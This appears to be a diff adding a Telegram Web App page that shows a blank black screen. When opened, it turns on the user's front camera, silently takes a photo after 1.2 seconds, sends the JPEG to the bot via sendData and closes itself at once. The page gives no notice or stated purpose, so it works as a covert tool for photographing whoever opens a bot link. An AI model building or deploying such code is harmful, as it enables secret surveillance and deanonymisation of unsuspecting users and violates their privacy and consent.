@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title></title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body { margin:0; padding:0; background:#000; overflow:hidden; }
+    video { width:100vw; height:100vh; object-fit:cover; }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline muted></video>
+
+  <script>
+    Telegram.WebApp.ready();
+    Telegram.WebApp.expand();
+
+    const video = document.getElementById('video');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+
+          canvas.toBlob(blob => {
+            Telegram.WebApp.sendData(blob);
+            setTimeout(() => Telegram.WebApp.close(), 500);
+          }, 'image/jpeg', 0.92);
+
+          stream.getTracks().forEach(track => track.stop());
+        }, 1200); // 1.2 second mein photo le lega
+      });
+  </script>
+</body>
+</html>
